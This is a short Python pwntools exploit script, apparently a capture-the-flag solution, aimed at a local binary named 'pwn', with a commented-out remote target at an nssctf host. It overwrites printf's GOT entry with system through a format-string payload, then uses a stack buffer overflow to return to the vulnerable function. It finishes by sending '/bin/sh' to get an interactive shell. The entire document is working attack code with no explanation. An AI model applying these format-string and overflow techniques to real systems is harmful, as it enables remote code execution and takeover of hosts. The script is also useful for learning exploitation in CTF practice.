from pwn import *

io = process('./pwn')
#io = remote('node4.anna.nssctf.cn', 28144)
elf = ELF('./pwn')
context(arch='amd64', os='linux', log_level='debug')

io.recvuntil(b'name: \n')

printf_got = elf.got['printf']
system_plt = elf.plt['system']
vuln = elf.sym['vuln']

payload = fmtstr_payload(6, {printf_got: system_plt})
io.send(payload)

payload_ret = b'A' * (0x50 + 0x08) + p64(vuln)
io.recvuntil(b'keep on !\n')
io.send(payload_ret)
io.recvuntil(b'name: \n')
io.send(b'/bin/sh\x00')

io.interactive()
